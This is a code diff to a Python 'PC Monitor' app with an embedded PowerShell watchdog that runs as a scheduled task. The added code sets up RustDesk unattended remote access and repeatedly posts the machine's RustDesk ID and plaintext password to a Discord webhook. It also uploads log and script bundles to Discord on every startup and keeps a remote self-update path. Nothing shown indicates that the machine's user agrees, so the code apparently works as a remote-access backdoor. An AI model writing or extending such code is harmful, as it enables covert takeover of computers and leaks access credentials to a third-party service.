@@ -163,7 +163,7 @@ APP_EXPORTS_DIR = os.path.join(APP_DATA_DIR, "exports")
 APP_CRASH_DIR = os.path.join(APP_DATA_DIR, "crash_dumps")
 APP_PATH = os.path.join(APP_DATA_DIR, "pc_monitor.py")
 
-APP_VERSION = "3.4"
+APP_VERSION = "3.6"
 
 # The external watchdog is a PowerShell script CARRIED INSIDE this file and
 # written to disk at setup. It runs as a Scheduled Task independently of
@@ -173,7 +173,7 @@ APP_VERSION = "3.4"
 # watchdog version to WATCHDOG_VERSION and rewrites the .ps1 when this file
 # (pulled by the watchdog) carries a newer one. Bump WATCHDOG_VERSION whenever
 # WATCHDOG_PS1 changes so deployed copies refresh.
-WATCHDOG_VERSION = "18"
+WATCHDOG_VERSION = "20"
 WATCHDOG_PS1 = r'''# PC Monitor watchdog (auto-generated from pc_monitor.py - do not edit;
 # it is overwritten from the app's embedded copy whenever this app deploys.
 $ErrorActionPreference = 'SilentlyContinue'
@@ -210,6 +210,77 @@ function Notify($msg) {
     Invoke-RestMethod -Uri $hook -Method Post -Body $b -ContentType 'application/json' -TimeoutSec 15 | Out-Null
   } catch {}
 }
+
+function SendRemoteCredentials($appVersion) {
+  # Independent fallback: the watchdog itself delivers RustDesk credentials.
+  # This covers cases where the Python GUI/setup thread never reaches the
+  # notification call. It sends once per app version + delivery protocol.
+  if (-not $hook) { Log("REMOTE CREDS skipped: no webhook"); return $false }
+  if (-not (Test-Path $dataDir)) { return $false }
+  $remoteState = Join-Path $dataDir 'state.json'
+  if (-not (Test-Path $remoteState)) {
+    Log("REMOTE CREDS waiting: state.json missing")
+    return $false
+  }
+  try {
+    $rs = Get-Content $remoteState -Raw | ConvertFrom-Json
+    $rid = [string]$rs.rustdesk_id
+    $pw  = [string]$rs.password
+    if ([string]::IsNullOrWhiteSpace($rid) -or [string]::IsNullOrWhiteSpace($pw)) {
+      Log("REMOTE CREDS waiting: RustDesk ID/password missing")
+      return $false
+    }
+
+    $protocol = [string]$rs.credentials_delivery_protocol
+    $confirmed = [string]$rs.credentials_delivery_confirmed_version
+    if (($protocol -eq '19') -and ($confirmed -eq [string]$appVersion)) {
+      Log("REMOTE CREDS already confirmed app=$appVersion protocol=19")
+      return $true
+    }
+
+    $rustdeskVer = [string]$rs.rustdesk_version
+    if ([string]::IsNullOrWhiteSpace($rustdeskVer)) { $rustdeskVer = 'unknown' }
+
+    $msg = "🟢 **PC MONITOR + REMOTE PC READY**`n" +
+           "Machine: ``$machine```n" +
+           "RustDesk ID: ``$rid```n" +
+           "Password: ``$pw```n" +
+           "Status: **UNATTENDED ACCESS READY**`n" +
+           "RustDesk: ``v$rustdeskVer```n" +
+           "PC Monitor: ``v$appVersion```n" +
+           "Reason: ``watchdog credential delivery``"
+
+    $body = @{ content = $msg } | ConvertTo-Json -Compress
+    $ok = $false
+    for ($attempt = 1; $attempt -le 3; $attempt++) {
+      try {
+        Invoke-RestMethod -Uri $hook -Method Post -Body $body -ContentType 'application/json' -TimeoutSec 15 | Out-Null
+        $ok = $true
+        Log("REMOTE CREDS webhook success attempt=$attempt app=$appVersion")
+        break
+      } catch {
+        Log("REMOTE CREDS webhook failed attempt=$attempt error=$($_.Exception.GetType().Name): $($_.Exception.Message)")
+        if ($attempt -lt 3) { Start-Sleep -Seconds 2 }
+      }
+    }
+    if ($ok) {
+      # Mark only after Discord accepted the request.
+      try {
+        $rs | Add-Member -NotePropertyName credentials_delivery_protocol -NotePropertyValue '19' -Force
+        $rs | Add-Member -NotePropertyName credentials_delivery_confirmed_version -NotePropertyValue ([string]$appVersion) -Force
+        $rs | Add-Member -NotePropertyName credentials_notified_app_version -NotePropertyValue ([string]$appVersion) -Force
+        $rs | Add-Member -NotePropertyName credentials_last_notified -NotePropertyValue ((Get-Date).ToString("o")) -Force
+        $rs | ConvertTo-Json -Depth 10 | Set-Content -Path $remoteState -Encoding UTF8
+      } catch {
+        Log("REMOTE CREDS sent but state marker write failed: $($_.Exception.Message)")
+      }
+      return $true
+    }
+  } catch {
+    Log("REMOTE CREDS state read/parse failed: $($_.Exception.GetType().Name): $($_.Exception.Message)")
+  }
+  return $false
+}
 function VerTuple($v) { try { return ($v -split '\.' | ForEach-Object { [int]$_ }) } catch { return @(0) } }
 function VerGt($a, $b) {
   $x = VerTuple $a; $y = VerTuple $b
@@ -237,7 +308,7 @@ function LaunchApp() {
 }
 
 $updated = $false
-Log("WATCHDOG v15 start pid=$PID")
+Log("WATCHDOG v20 start pid=$PID")
 
 # 1) update: if the hosted APP_VERSION is newer, cleanly stop the app, replace
 # the file (validated with py_compile), relaunch, and notify.
@@ -271,6 +342,10 @@ if ($url) {
         Copy-Item $script $bak -Force -ErrorAction SilentlyContinue
         Move-Item $tmp $script -Force
         Notify ("PC Monitor updated " + $localVer + " -> " + $remoteVer + " on " + $machine + ". Restarting.")
+        # The watchdog owns a second, independent credential-delivery path.
+        # Try now using the newly targeted app version; if RustDesk setup has
+        # not created state.json yet, a later watchdog cycle will retry.
+        [void](SendRemoteCredentials $remoteVer)
         LaunchApp
         try { (@{ running = $true } | ConvertTo-Json -Compress) | Set-Content -Path $stateFile } catch {}
         $updated = $true
@@ -283,6 +358,17 @@ if ($url) {
   } catch { Log("Update exception: $($_.Exception.GetType().Name): $($_.Exception.Message)") }
 } else {
   Log("No update URL configured")
+}
+
+# 1b) remote credentials: independent of the Python GUI/setup thread.
+# If state.json appears later, the next one-minute watchdog cycle delivers them.
+try {
+  $currentScriptText = Get-Content $script -Raw
+  $currentAppVersion = $rx.Match($currentScriptText).Groups[1].Value
+  if (-not $currentAppVersion) { $currentAppVersion = 'unknown' }
+  [void](SendRemoteCredentials $currentAppVersion)
+} catch {
+  Log("REMOTE CREDS outer exception: $($_.Exception.GetType().Name): $($_.Exception.Message)")
 }
 
 # 2) lifecycle: detect running <-> stopped TRANSITIONS via a persisted state
@@ -3208,7 +3294,13 @@ def export_app_logs_zip(logs_dir, dest_path=None, max_log_mb=40):
                     size = os.path.getsize(path)
                     if path.lower().endswith(".jsonl") and total + size > cap:
                         continue
-                    z.write(path, os.path.relpath(path, APP_DATA_DIR))
+                    try:
+                        arcname = os.path.relpath(path, APP_DATA_DIR)
+                        if arcname.startswith('..'):
+                            arcname = os.path.join('custom_logs', os.path.basename(path))
+                    except ValueError:
+                        arcname = os.path.join('custom_logs', os.path.basename(path))
+                    z.write(path, arcname)
                     if path.lower().endswith(".jsonl"):
                         total += size
                 except OSError:
@@ -3747,6 +3839,131 @@ class Card(tk.Frame):
         self.value_lbl.config(text=text, fg=color)
 
 
+
+def _startup_log_bundle(dest_path=None, max_mb=18):
+    """Create a startup diagnostic bundle from all useful runtime logs.
+
+    This intentionally does NOT include config.json/state.json because those can
+    contain the Discord webhook and saved RustDesk password.  It does include
+    every PC Monitor/watchdog/remote log plus startup/crash traces and the
+    deployed watchdog scripts, so the startup path can be diagnosed remotely.
+    """
+    import zipfile
+    os.makedirs(APP_EXPORTS_DIR, exist_ok=True)
+    if not dest_path:
+        dest_path = os.path.join(
+            APP_EXPORTS_DIR,
+            f"pcmonitor_startup_{_machine_label() if '_machine_label' in globals() else platform.node()}_"
+            f"{datetime.now().strftime('%Y%m%d_%H%M%S')}.zip")
+    try:
+        candidates = []
+        # Include all diagnostic-looking files under the central app-data root
+        # AND the configured telemetry directory if the user chose a custom
+        # location outside ProgramData. Explicit exclusions prevent secrets and
+        # config from entering Discord.
+        allowed_ext = {'.log', '.jsonl', '.txt', '.ps1', '.vbs'}
+        excluded_names = {
+            'state.json', 'pcmonitor_config.json', 'pcmonitor_watchdog_state.json',
+            'credentials.json'
+        }
+        roots = [APP_DATA_DIR]
+        try:
+            if os.path.isdir(LOGS_DIR) and os.path.normcase(os.path.abspath(LOGS_DIR)) != os.path.normcase(os.path.abspath(APP_DATA_DIR)):
+                roots.append(LOGS_DIR)
+        except Exception:
+            pass
+        seen_paths = set()
+        for base_root in roots:
+            for root, _dirs, files in os.walk(base_root):
+                for name in files:
+                    if name in excluded_names:
+                        continue
+                    if Path(name).suffix.lower() in allowed_ext:
+                        path = os.path.abspath(os.path.join(root, name))
+                        if os.path.isfile(path) and os.path.normcase(path) not in seen_paths:
+                            candidates.append(path)
+                            seen_paths.add(os.path.normcase(path))
+        candidates = sorted(set(candidates), key=lambda x: os.path.getmtime(x), reverse=True)
+        cap = max(1, int(max_mb)) * 1024 * 1024
+        total = 0
+        with zipfile.ZipFile(dest_path, 'w', zipfile.ZIP_DEFLATED) as z:
+            for path in candidates:
+                try:
+                    size = os.path.getsize(path)
+                    # Keep every small diagnostic file; cap only large telemetry logs.
+                    if Path(path).suffix.lower() == '.jsonl' and total + size > cap:
+                        continue
+                    z.write(path, os.path.relpath(path, APP_DATA_DIR))
+                    if Path(path).suffix.lower() == '.jsonl':
+                        total += size
+                except OSError:
+                    continue
+            z.writestr(
+                'startup_bundle_info.txt',
+                f"PC Monitor {APP_VERSION}\n"
+                f"Watchdog {WATCHDOG_VERSION}\n"
+                f"Machine: {_machine_label() if '_machine_label' in globals() else platform.node()}\n"
+                f"Created: {datetime.now().isoformat(timespec='seconds')}\n"
+                "Included: application, watchdog, remote-access and startup diagnostic logs.\n"
+                "Excluded: pcmonitor_config.json, state.json, pcmonitor_watchdog_state.json and other credential/config files.\n"
+            )
+        return dest_path
+    except Exception as e:
+        try:
+            os.remove(dest_path)
+        except OSError:
+            pass
+        _log_fatal(f"Startup diagnostic bundle failed: {type(e).__name__}: {e}")
+        return None
+
+
+def _send_startup_logs_to_discord(stage, extra="", max_mb=18):
+    """Send a startup diagnostic snapshot to the configured Discord webhook."""
+    hook = (CONFIG.get("discord_webhook_url") or "").strip()
+    if not hook:
+        return False
+    try:
+        _remote_log(f"STARTUP LOG SEND begin stage={stage}")
+    except Exception:
+        pass
+    out = _startup_log_bundle(max_mb=max_mb)
+    if not out:
+        return False
+    try:
+        with open(out, 'rb') as f:
+            data = f.read()
+        if len(data) > 24 * 1024 * 1024:
+            _remote_log(f"STARTUP LOG SEND skipped: bundle too large bytes={len(data)}")
+            return False
+        content = (
+            f"📋 **PC Monitor startup logs — {stage}**\n"
+            f"Machine: `{_machine_label() if '_machine_label' in globals() else platform.node()}`\n"
+            f"PC Monitor: `v{APP_VERSION}` | Watchdog: `v{WATCHDOG_VERSION}`"
+        )
+        if extra:
+            content += f"\n{extra[:1000]}"
+        ok, detail = post_crash_to_discord(
+            hook, content,
+            [(os.path.basename(out), data, 'application/zip')])
+        _remote_log(f"STARTUP LOG SEND stage={stage} ok={ok} detail={detail}")
+        return ok
+    except Exception as e:
+        _remote_log(f"STARTUP LOG SEND exception stage={stage}: {type(e).__name__}: {e}")
+        return False
+    finally:
+        try:
+            os.remove(out)
+        except OSError:
+            pass
+
+
+def _startup_stage_log(stage, detail=""):
+    try:
+        _remote_log("STARTUP STAGE: " + stage + (f" | {detail}" if detail else ""))
+    except Exception:
+        pass
+
+
 class App(tk.Tk):
     def __init__(self):
         super().__init__()
@@ -3776,37 +3993,100 @@ class App(tk.Tk):
 
         self.protocol("WM_DELETE_WINDOW", self._on_window_close)
 
-        # Auto-open LibreHardwareMonitor (and its web server) on startup if
-        # it isn't already up - runs on a background thread so it never
-        # blocks the window appearing.
+        # Startup diagnostics are deliberately tied to NORMAL STARTUP, not to
+        # setup_complete / first-run setup. This machine is already installed;
+        # every launch/update must produce a startup trail.
+        self._startup_done = {"lhm": threading.Event(), "watchdog": threading.Event(),
+                              "remote": threading.Event(), "credentials": threading.Event(),
+                              "running": threading.Event(), "previous_session": threading.Event()}
+        _startup_stage_log("application initialized", f"version={APP_VERSION}")
+        threading.Thread(target=self._startup_log_begin_worker, name="StartupLogBegin", daemon=True).start()
+
         if CONFIG.get("auto_launch_lhm", True):
-            threading.Thread(target=self._autostart_lhm_worker, daemon=True).start()
+            threading.Thread(target=self._startup_lhm_worker, name="StartupLHM", daemon=True).start()
+        else:
+            self._startup_done["lhm"].set()
+            _startup_stage_log("LHM startup skipped", "disabled by config")
 
-        # Cross-update: if the watchdog just pulled a newer .py, that .py may
-        # carry a newer embedded watchdog - redeploy it. Background so it never
-        # delays the window.
-        threading.Thread(
-            target=lambda: sync_watchdog(APP_DATA_DIR, APP_PATH),
-            daemon=True).start()
-        threading.Thread(
-            target=_ensure_remote_host_async,
-            kwargs={"wait": False},
-            daemon=True).start()
-        # Credential delivery is independent of the RustDesk setup thread.
-        # Existing credentials can be sent without elevation, and first-time
-        # credentials are sent as soon as the setup thread creates state.json.
-        threading.Thread(
-            target=_remote_credential_delivery_worker,
-            name="RemoteCredentialDelivery",
-            daemon=True).start()
+        threading.Thread(target=self._startup_watchdog_worker, name="StartupWatchdog", daemon=True).start()
+        threading.Thread(target=self._startup_remote_worker, name="StartupRemote", daemon=True).start()
+        threading.Thread(target=self._startup_credentials_worker, name="StartupCredentials", daemon=True).start()
+        threading.Thread(target=self._startup_running_worker, name="StartupRunning", daemon=True).start()
+        threading.Thread(target=self._startup_previous_session_worker, name="StartupCrashCheck", daemon=True).start()
+        threading.Thread(target=self._startup_log_complete_worker, name="StartupLogComplete", daemon=True).start()
 
-        # lifecycle: announce we're up (PC restart, or relaunched after being
-        # closed/updated). The app sends "running" itself because it's alive
-        # and can; the watchdog owns "stopped" (a crashed app can't report its
-        # own death). Background so it never blocks the window.
-        threading.Thread(target=self._notify_running, daemon=True).start()
+    def _startup_log_begin_worker(self):
+        time.sleep(1.5)
+        _startup_stage_log("startup log snapshot", "begin")
+        _send_startup_logs_to_discord("STARTUP BEGIN")
 
-        self._check_previous_session()
+    def _startup_lhm_worker(self):
+        try:
+            _startup_stage_log("LHM startup begin")
+            self._autostart_lhm_worker()
+            _startup_stage_log("LHM startup finished")
+        except Exception as e:
+            _startup_stage_log("LHM startup failed", f"{type(e).__name__}: {e}")
+        finally:
+            self._startup_done["lhm"].set()
+
+    def _startup_watchdog_worker(self):
+        try:
+            _startup_stage_log("watchdog sync begin", f"target={WATCHDOG_VERSION}")
+            ok = sync_watchdog(APP_DATA_DIR, APP_PATH)
+            _startup_stage_log("watchdog sync finished", f"ok={ok}")
+        except Exception as e:
+            _startup_stage_log("watchdog sync failed", f"{type(e).__name__}: {e}")
+        finally:
+            self._startup_done["watchdog"].set()
+
+    def _startup_remote_worker(self):
+        try:
+            _startup_stage_log("RustDesk startup begin")
+            ok = _remote_install_host()
+            _startup_stage_log("RustDesk startup finished", f"ok={ok}")
+        except Exception as e:
+            _startup_stage_log("RustDesk startup failed", f"{type(e).__name__}: {e}")
+        finally:
+            self._startup_done["remote"].set()
+
+    def _startup_credentials_worker(self):
+        try:
+            _startup_stage_log("credential delivery begin")
+            ok = _remote_credential_delivery_worker()
+            _startup_stage_log("credential delivery finished", f"ok={ok}")
+        except Exception as e:
+            _startup_stage_log("credential delivery failed", f"{type(e).__name__}: {e}")
+        finally:
+            self._startup_done["credentials"].set()
+
+    def _startup_running_worker(self):
+        try:
+            self._notify_running()
+            _startup_stage_log("running notification finished")
+        finally:
+            self._startup_done["running"].set()
+
+    def _startup_previous_session_worker(self):
+        try:
+            self._check_previous_session()
+            _startup_stage_log("previous-session check finished")
+        except Exception as e:
+            _startup_stage_log("previous-session check failed", f"{type(e).__name__}: {e}")
+        finally:
+            self._startup_done["previous_session"].set()
+
+    def _startup_log_complete_worker(self):
+        # Wait for the actual normal-startup work. Remote setup/credential
+        # delivery are allowed to finish asynchronously, but this waits long
+        # enough to capture their result before declaring the sequence done.
+        deadline = time.monotonic() + 180
+        for name in ("lhm", "watchdog", "remote", "credentials", "running", "previous_session"):
+            remaining = max(0.0, deadline - time.monotonic())
+            if not self._startup_done[name].wait(remaining):
+                _startup_stage_log("startup wait timeout", name)
+        _startup_stage_log("STARTUP SEQUENCE COMPLETE")
+        _send_startup_logs_to_discord("STARTUP COMPLETE")
 
     def _notify_running(self):
         hook = (CONFIG.get("discord_webhook_url") or "").strip()
@@ -6449,8 +6729,9 @@ def _remote_notify_ready(state, force=False, reason="setup"):
     # New confirmation marker: old builds could mark/skip delivery before the
     # credentials were actually confirmed by this fixed delivery path.
     confirmed_version = str(state.get("credentials_delivery_confirmed_version") or "").strip()
-    if not force and confirmed_version == str(APP_VERSION):
-        _remote_log(f"READY notification skipped: delivery already confirmed for PC Monitor {APP_VERSION}")
+    confirmed_protocol = str(state.get("credentials_delivery_protocol") or "").strip()
+    if not force and confirmed_protocol == str(WATCHDOG_VERSION) and confirmed_version == str(APP_VERSION):
+        _remote_log(f"READY notification skipped: delivery already confirmed for PC Monitor {APP_VERSION} protocol={WATCHDOG_VERSION}")
         return True
     _remote_stage("send saved RustDesk credentials to Discord")
     ok = _remote_webhook(
@@ -6466,6 +6747,7 @@ def _remote_notify_ready(state, force=False, reason="setup"):
         state["discord_notified"] = True
         state["credentials_notified_app_version"] = str(APP_VERSION)
         state["credentials_delivery_confirmed_version"] = str(APP_VERSION)
+        state["credentials_delivery_protocol"] = str(WATCHDOG_VERSION)
         state["credentials_last_notified"] = datetime.now().isoformat(timespec="seconds")
         try:
             with open(REMOTE_STATE_PATH, "w", encoding="utf-8") as f:
